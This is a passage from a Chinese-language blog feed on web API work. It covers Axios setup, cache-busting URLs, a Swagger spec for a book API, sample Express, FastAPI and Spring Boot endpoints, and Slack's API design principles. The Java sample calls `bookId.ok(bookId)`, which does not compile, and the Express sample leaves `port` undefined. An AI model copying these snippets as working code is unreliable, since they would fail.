(<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="comment">// Error :(</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h4 id="Axios"><a href="#Axios" class="headerlink" title="Axios"></a>Axios</h4><p><a href="https://github.com/axios/axios">axios</a> 除了整合上面的功能外，提供了簡化的寫法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">&quot;http://localhost:8080/api/v1/book/1&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>配置基本設定把一些常用的設定或共用一些需要的防呆實作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基本設定</span></span><br><span class="line"><span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&quot;https://some-domain.com/api/&quot;</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">1000</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&quot;X-Custom-Header&quot;</span>: <span class="string">&quot;foobar&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// request interceptor 統一處理邏輯</span></span><br><span class="line">axios.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">config</span>) &#123;</span><br><span class="line">    <span class="comment">// request 送出前</span></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="comment">// request 錯誤</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// response interceptor 處理回應</span></span><br><span class="line">axios.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="comment">// 可統一針對各種 Status Code 處理</span></span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="comment">// 統一錯誤處理</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>Vue.js 的文件也有介紹使用這套函式庫，透過配置將 client 和<a href="https://vuejs.org/v2/cookbook/adding-instance-properties.html#Real-World-Example-Replacing-Vue-Resource-with-Axios">vue 的 instance 綁在一起</a>，可以直接透過<code>this.$http</code>來叫用。</p><h2 id="AJAX-打-API-避免快取"><a href="#AJAX-打-API-避免快取" class="headerlink" title="AJAX 打 API 避免快取"></a>AJAX 打 API 避免快取</h2><p>將時間或亂數以適當的 <code>?</code> 或 <code>&amp;</code> 加在 URL 後方就可以做到避免快取且跨瀏覽器相容。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不快取網頁</span></span><br><span class="line"><span class="keyword">const</span> cachedURL = <span class="string">&quot;http://test.com/index.html&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> unCachedURL = <span class="string">&quot;http://test.com/index.html?12345&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不快取 API</span></span><br><span class="line"><span class="keyword">const</span> cachedAPI = <span class="string">&quot;http://test.com/api/demo?name=test&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> unCachedAPI = <span class="string">&quot;http://test.com/api/demo?name=test&amp;12345&quot;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web API 實作解析</title>
      <link href="/2022/09/17/relationships-between-frontend-and-backend/backend-api-implement/"/>
      <url>/2022/09/17/relationships-between-frontend-and-backend/backend-api-implement/</url>
      
        <content type="html"><![CDATA[<p>小編在另外兩篇文章分別介紹了<a href="https://linyencheng.github.io/2022/09/15/relationships-between-frontend-and-backend/backend-restful-api/">什麼是 API</a>和 <a href="https://linyencheng.github.io/2022/09/16/relationships-between-frontend-and-backend/backend-api-design/">API 系統設計方法</a>，談了許多 API 概念上的東西。</p><p>這篇文章會從實作的角度用 JavaScript、Java、Python 來實作後端的 Web API。</p><p>實作就是最好的學習，這就跟讀了很多把妹相關的書籍，還不如註冊個交友軟體天天練習跟女生聊天一樣，小編在年初也是因為受到直屬學弟們的<strong>鼓勵</strong>就真的註冊了而且還天天晚上都在熬夜聊天。</p><p>Web API 在實作上主要是兩個步驟</p><ol><li>API 規格文件撰寫</li><li>API 系統實作</li></ol><h2 id="API-規格文件撰寫"><a href="#API-規格文件撰寫" class="headerlink" title="API 規格文件撰寫"></a>API 規格文件撰寫</h2><p>這裡先手動進行 Swagger 的 YAML 撰寫，撰寫語法不困難。</p><p>底下列出一個基本的範例，整份文件其實就圍繞著 API 的<strong>輸入</strong>及<strong>輸出</strong>兩大重點</p><ol><li><strong>輸出</strong>: 定義回傳資料格式</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">definitions:</span></span><br><span class="line">  <span class="attr">Book:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">&quot;object&quot;</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">id:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">        <span class="attr">format:</span> <span class="string">&quot;int64&quot;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>輸入</strong>: 定義<strong>路徑</strong>與 <strong>HTTP 方法</strong>及<strong>輸入參數</strong></li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">paths:</span></span><br><span class="line">  <span class="string">/api/v1/book/&#123;bookId&#125;:</span></span><br><span class="line">    <span class="attr">get:</span></span><br><span class="line">      <span class="attr">tags:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;Book&quot;</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">&quot;Find Book by ID&quot;</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">&quot;For valid response try integer IDs with value &gt;= 1&quot;</span></span><br><span class="line">      <span class="attr">operationId:</span> <span class="string">&quot;getBookById&quot;</span></span><br><span class="line">      <span class="attr">produces:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;application/json&quot;</span></span><br><span class="line">      <span class="attr">parameters:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;bookId&quot;</span></span><br><span class="line">          <span class="attr">in:</span> <span class="string">&quot;path&quot;</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;ID of pet that needs to be fetched&quot;</span></span><br><span class="line">          <span class="attr">required:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">          <span class="attr">maximum:</span> <span class="number">10.0</span></span><br><span class="line">          <span class="attr">minimum:</span> <span class="number">1.0</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&quot;int64&quot;</span></span><br><span class="line">      <span class="attr">responses:</span></span><br><span class="line">        <span class="attr">&quot;200&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;successful operation&quot;</span></span><br><span class="line">          <span class="attr">schema:</span></span><br><span class="line">            <span class="string">$ref:</span> <span class="string">&quot;#/definitions/Book&quot;</span></span><br><span class="line">        <span class="attr">&quot;400&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;Invalid ID supplied&quot;</span></span><br><span class="line">        <span class="attr">&quot;404&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;Order not found&quot;</span></span><br></pre></td></tr></table></figure><p>各位大大可以自行複製完整的版本到線上的 <a href="https://editor.swagger.io/">Swagger Editor</a> 看看結果。<br>Swagger Editor: <a href="https://editor.swagger.io/">https://editor.swagger.io/</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">swagger:</span> <span class="string">&quot;2.0&quot;</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">&quot;API 文件&quot;</span></span><br><span class="line">  <span class="attr">version:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">&quot;Swagger Book Store&quot;</span></span><br><span class="line"><span class="attr">host:</span> <span class="string">&quot;swagger.io&quot;</span></span><br><span class="line"><span class="attr">basePath:</span> <span class="string">&quot;/v1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">schemes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;https&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;http&quot;</span></span><br><span class="line"><span class="attr">paths:</span></span><br><span class="line">  <span class="string">/api/v1/book/&#123;bookId&#125;:</span></span><br><span class="line">    <span class="attr">get:</span></span><br><span class="line">      <span class="attr">tags:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;Book&quot;</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">&quot;Find Book by ID&quot;</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">&quot;For valid response try integer IDs with value &gt;= 1&quot;</span></span><br><span class="line">      <span class="attr">operationId:</span> <span class="string">&quot;getBookById&quot;</span></span><br><span class="line">      <span class="attr">produces:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&quot;application/json&quot;</span></span><br><span class="line">      <span class="attr">parameters:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;bookId&quot;</span></span><br><span class="line">          <span class="attr">in:</span> <span class="string">&quot;path&quot;</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;ID of pet that needs to be fetched&quot;</span></span><br><span class="line">          <span class="attr">required:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">          <span class="attr">maximum:</span> <span class="number">10.0</span></span><br><span class="line">          <span class="attr">minimum:</span> <span class="number">1.0</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&quot;int64&quot;</span></span><br><span class="line">      <span class="attr">responses:</span></span><br><span class="line">        <span class="attr">&quot;200&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;successful operation&quot;</span></span><br><span class="line">          <span class="attr">schema:</span></span><br><span class="line">            <span class="string">$ref:</span> <span class="string">&quot;#/definitions/Book&quot;</span></span><br><span class="line">        <span class="attr">&quot;400&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;Invalid ID supplied&quot;</span></span><br><span class="line">        <span class="attr">&quot;404&quot;:</span></span><br><span class="line">          <span class="attr">description:</span> <span class="string">&quot;Order not found&quot;</span></span><br><span class="line"><span class="attr">definitions:</span></span><br><span class="line">  <span class="attr">Book:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">&quot;object&quot;</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">id:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">        <span class="attr">format:</span> <span class="string">&quot;int64&quot;</span></span><br></pre></td></tr></table></figure><p>一個較正式且完整的文件範例:</p><iframe width="560" height="315" src="https://petstore.swagger.io/" frameborder="0" allowfullscreen></iframe><h2 id="API-系統實作"><a href="#API-系統實作" class="headerlink" title="API 系統實作"></a>API 系統實作</h2><p>後端的 API 其實不限制用什麼語言進行撰寫，各種語言撰寫上需要注意的觀念也大同小異，建議選擇熟悉的語言進行學習即可。</p><p>API 撰寫上有三個重點</p><ol><li>路徑: 包含版本、符合 REST 的規範</li><li>輸入: 參數的各種類型</li><li>輸出: 回傳格式</li></ol><p>每個語言會有各自特性還有需要注意的觀念，底下會就小編的理解跟大家分享和解釋。</p><h3 id="JavaScript-API-X-Expressjs"><a href="#JavaScript-API-X-Expressjs" class="headerlink" title="JavaScript API X Expressjs"></a>JavaScript API X Expressjs</h3><ol><li><p>觀念:<br>JavaScript 後端的實作語法概念跟前端其實並沒有太大的差異，觀念主要是單線程且 non-blocking 的設計，正常執行每一行程式時都不會卡住，所以大多都會搭配 Callback Function 進行處理。</p></li><li><p>Swagger:<br>可能因為不是強型別，所以需要手工撰寫 OpenAPI 格式的 yaml 才能夠支援 Swagger。</p></li><li><p>延伸閱讀:<br>由於 Express 這類框架無法操作資料庫，所以將資料表示為 JavaScript 的 Object，再透過 ODM&#x2F;ORM 工具去達到操作資料庫的目的，推薦透過 <a href="https://linyencheng.github.io/2019/09/07/tool-mongoose-mongo/">Mongoose 操作資料，只要三步驟就能打穿 MongoDB 到 API</a>，ODM&#x2F;ORM 通常能降低開發及維護成本，網站分成前跟後端而 Mongoose 也可以看成是 MongoDB 的前端介面。</p></li></ol><p>範例程式碼:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/v1/book/:bookId&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">bookId</span>: req.<span class="property">params</span>.<span class="property">bookId</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Python-API-X-FastAPI"><a href="#Python-API-X-FastAPI" class="headerlink" title="Python API X FastAPI"></a>Python API X FastAPI</h3><ol><li><p>觀念:<br>打字打最少也最方便的一個語言，FastAPI 提供了方便快速開發的環境，透過自動產生文件與支援型別確認減少錯誤，官方文件表示能夠減少大約 40% 的人為錯誤。</p></li><li><p>Swagger:<br>內建自動產生 openapi 的即時文件支援 Swagger、redoc，詳細說明可以參考這份文件: <a href="https://fastapi.tiangolo.com/#interactive-api-docs">https://fastapi.tiangolo.com/#interactive-api-docs</a></p></li><li><p>延伸閱讀:<br><a href="https://linyencheng.github.io/2021/10/08/python-fast-api/">Python FastAPI 快速入門，7 行程式完成 API 和線上互動文件</a>。</p></li></ol><p>範例程式碼:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/api/v1/book/&#123;bookId&#125;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_book_by_id</span>(<span class="params">bookId: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;bookId&#x27;</span>: bookId</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Java-API-X-Springboot"><a href="#Java-API-X-Springboot" class="headerlink" title="Java API X Springboot"></a>Java API X Springboot</h3><ol><li><p>觀念:<br>Java 後端的框架看來看去其實就是兩個觀念，Inversion of Control (IOC) 跟 Dependency Injection (DI)，控制反轉實作上會使用 <code>@</code> 的方式來進行依賴注入。</p></li><li><p>Swagger:<br>支援 Swagger 文件自動產生: <a href="https://www.baeldung.com/spring-rest-openapi-documentation">https://www.baeldung.com/spring-rest-openapi-documentation</a></p></li><li><p>延伸閱讀:<br><a href="https://linyencheng.github.io/2018/04/05/java-web/">Java Web API (RESTful API) 教學，三步驟打通關節開發 API 後端服務</a>，主要會示範使用 Jersey 這套框架從 0 到 1 打造一個網站應用程式，並整理 Java Web Appication 相關資源如基礎建設、前端網頁、後端 Web API 及資料庫。</p></li></ol><p>範例程式碼:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@GetMapping(&quot;/api/v1/book/&#123;bookId&#125;&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">getBookById</span><span class="params">(<span class="meta">@PathVariable</span> String bookId)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> bookId.ok(bookId);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> Backend </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>API 系統設計方法 X 面試指南</title>
      <link href="/2022/09/16/relationships-between-frontend-and-backend/backend-api-design/"/>
      <url>/2022/09/16/relationships-between-frontend-and-backend/backend-api-design/</url>
      
        <content type="html"><![CDATA[<p>API 重要的是訊息交換，在意的是傳入和傳出，就像談戀愛的時候，要知道對方問了什麼問題可能是對你有好感，而又該怎麼應對。</p><p>API 在系統設計上通常是為了讓團隊合作而產生的，接下來這篇文章會從 API 系統設計流程和設計方法兩方面來切入。</p><h2 id="API-系統設計流程"><a href="#API-系統設計流程" class="headerlink" title="API 系統設計流程"></a>API 系統設計流程</h2><p>在 API 系統設計流程上粗分主要有三個階段:</p><ol><li>API 規格文件撰寫</li><li>內部審查</li><li>早期使用回饋與 Beta 測試</li></ol><p>撰寫規格文件就好像彼此認識對方的時候，會需要了解到對方的興趣、專長、家庭、價值觀等等，會詳細去了解和探討在溝通上可以促進或是防雷的地方。</p><p>內部審查比較像是雙方想要進一步發展，開始讓雙方父母認知到彼此的存在，並且開始與原生家庭進行相關的介紹和溝通。</p><p>早期使用回饋有點像是情侶之間先同居看看生活上那些需要彼此磨合和優化的地方。</p><h3 id="API-規格文件撰寫"><a href="#API-規格文件撰寫" class="headerlink" title="API 規格文件撰寫"></a>API 規格文件撰寫</h3><p>規格文件主要定義開發階段所需要的相關內容</p><ul><li>API Method 名稱、用途</li><li>request、response 範例</li><li>錯誤訊息</li></ul><p>撰寫方式有很多種，目前比較推薦的是按照相關規範撰寫或是通過工具去產生，前後端相關可參考 <a href="https://www.openapis.org/">OpenAPI</a>、<a href="https://www.asyncapi.com/">asyncapi</a>。</p><p>以小編過往的經驗來說，API Method 名稱、用途會在討論需求的過程中產生。</p><p>request、response 則是 API 的關鍵，會針對實作上會用到的傳入、傳輸進行討論以及規劃。</p><p>錯誤訊息則是進行相對應的例外處理，與需求和 API 本身設計較無相關，回傳的格式就看需要用戶針對錯誤進行什麼動作而定。</p><h3 id="內部審查"><a href="#內部審查" class="headerlink" title="內部審查"></a>內部審查</h3><p>在程式碼完成 API 功能撰寫後，內部審查主要著重在兩部分</p><ol><li>修改了什麼，是否影響已上線產品或 API</li><li>是否依照團隊規範去實作，審查的範圍一般包含命名、可用性、安全性、效能</li></ol><h3 id="早期使用者回饋與-Beta-測試"><a href="#早期使用者回饋與-Beta-測試" class="headerlink" title="早期使用者回饋與 Beta 測試"></a>早期使用者回饋與 Beta 測試</h3><p>舉 Facebook 維護的 React.js 來說，函式庫會提供像 <code>unstable_createRoot</code> 這樣的 API 讓早期使用者去使用並回饋。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&quot;react-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If you previously had:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You can opt into Concurrent Mode by writing:</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">unstable_createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;root&quot;</span>)).<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>);</span><br></pre></td></tr></table></figure><h2 id="API-設計方法"><a href="#API-設計方法" class="headerlink" title="API 設計方法"></a>API 設計方法</h2><p>以 API 的設計來說，主要會包含但不限於底下六個原則，接下來的六個概念主要翻譯 Slack 團隊分享的 <a href="https://slack.engineering/how-we-design-our-apis-at-slack/">how we design our apis at slack</a>。</p><ul><li>一次做好一件事</li><li>容易且能快速維護</li><li>一致性</li><li>回傳有意義的錯誤訊息</li><li>考量效能和可擴充性</li><li>避免 breaking changes</li></ul><h3 id="一次做好一件事"><a href="#一次做好一件事" class="headerlink" title="一次做好一件事"></a>一次做好一件事</h3><p>在 Function、API、元件、hook 的設計上，一次做好一件事都是重要的觀念，原因主要是:</p><ul><li>專業分工</li><li>容易優化效能</li><li>加東西比拿掉容易</li><li>容易理解</li><li>容易擴充</li><li>更安全</li></ul><h3 id="容易且能快速維護"><a href="#容易且能快速維護" class="headerlink" title="容易且能快速維護"></a>容易且能快速維護</h3><p>這同時也是使用框架或是架構良好的專案的優點，通常會具備以下特色</p><ul><li>良好的 Quick Start Guide</li><li>使用說明清楚</li><li>有示範的程式碼</li><li>文件可以直接互動，若沒有也可以使用 Postman 共用帳號來建立相關測試案例來達到</li></ul><p>小編第一份工作是後端工程師負責開 API，當時維護的專案是以 Java Jersey 為基礎的專案，現在回頭看就是一個架構良好、切分乾淨、容易且能快速維護的專案。</p><h3 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h3><p>在小編第一份工作的時候，就曾被主管要求過這件事情，他會希望同樣一個專案，不同的人寫出來的要像是同個人的作品。</p><ul><li>符合業界標準</li><li>不同專案也是要有一致的命名規則</li><li>寫作上的邏輯一致</li><li>命名避免縮寫、行話<ul><li>idx -&gt; index</li><li>fname -&gt; firstName</li></ul></li></ul><blockquote><p><img src="https://slack.engineering/wp-content/uploads/sites/7/2021/08/image3.png?resize=640,550"><br>圖片來源: <a href="https://slack.engineering/how-we-design-our-apis-at-slack/">https://slack.engineering/how-we-design-our-apis-at-slack/</a></p></blockquote><h3 id="回傳有意義的錯誤訊息"><a href="#回傳有意義的錯誤訊息" class="headerlink" title="回傳有意義的錯誤訊息"></a>回傳有意義的錯誤訊息</h3><p>語意化這件事情在註解、變數或函式命名、錯誤訊息都非常重要，也能說是常見的一種溝通技巧。</p><blockquote><p><img src="https://slack.engineering/wp-content/uploads/sites/7/2021/08/image5.png?resize=1280,795"><br>圖片來源: <a href="https://slack.engineering/how-we-design-our-apis-at-slack/">https://slack.engineering/how-we-design-our-apis-at-slack/</a></p></blockquote><h3 id="考量效能和可擴充性"><a href="#考量效能和可擴充性" class="headerlink" title="考量效能和可擴充性"></a>考量效能和可擴充性</h3><p>以臉書貼文留言來說，就能透過分頁來優化載入速度，再來是減少巢狀資料格式來降低複雜度</p><ul><li>分頁: 一次從後端撈取大量資料容易造成資料庫瓶頸，對前端也會造成操作卡頓</li><li>減少巢狀資料格式: 兩個大資料及巢狀合併會大大提升複雜度<ul><li>channels.list: list of channels and all members in each channel</li><li>conversations.list + conversations.members</li></ul></li><li>限制速率: 當 API 會被特定使用者或是爬蟲固定爬取時，就建議可以設定一些限制</li></ul><h3 id="避免-breaking-changes"><a href="#避免-breaking-changes" class="headerlink" title="避免 breaking changes"></a>避免 breaking changes</h3><p>通常版本升級理論上都要可以向下相容，才不會造成新版本上線後舊版程式無法使用的狀況。</p><p>過往待過公司經驗會是直接透過 URL 路徑來做區分:</p><ul><li><code>/v1.0/getUserInfomation</code></li><li><code>/v2.0/getUserInfomation</code></li></ul><p>若是有需要汰換 <code>v1.0</code> 也建議在 response message 中明確的留下提示。</p><h2 id="系統設計面試"><a href="#系統設計面試" class="headerlink" title="系統設計面試"></a>系統設計面試</h2><p>小編在最近一次轉職中，體驗過兩次系統設計面試。</p><p>第一次體驗的時候，完全搞不清楚對方想要問什麼，只覺得給了一個大範圍的問題，問題剛好又跟公司領域有關，覺得難道是要我直接講公司內部的秘密嗎? 當時也沒有反問對方想問什麼且對方也沒有引導，所以整場系統設計面試感覺就很奇怪。</p><p>第二場就直接問對方想要問什麼或需要我表達什麼，經過引導之後就比較了解狀況。小編覺得可以系統設計不用當作面試，就當作在工作討論未知問題即可，不過對於平常比較少畫架構圖的工程師可能會比較不習慣。</p><h3 id="系統設計面試流程"><a href="#系統設計面試流程" class="headerlink" 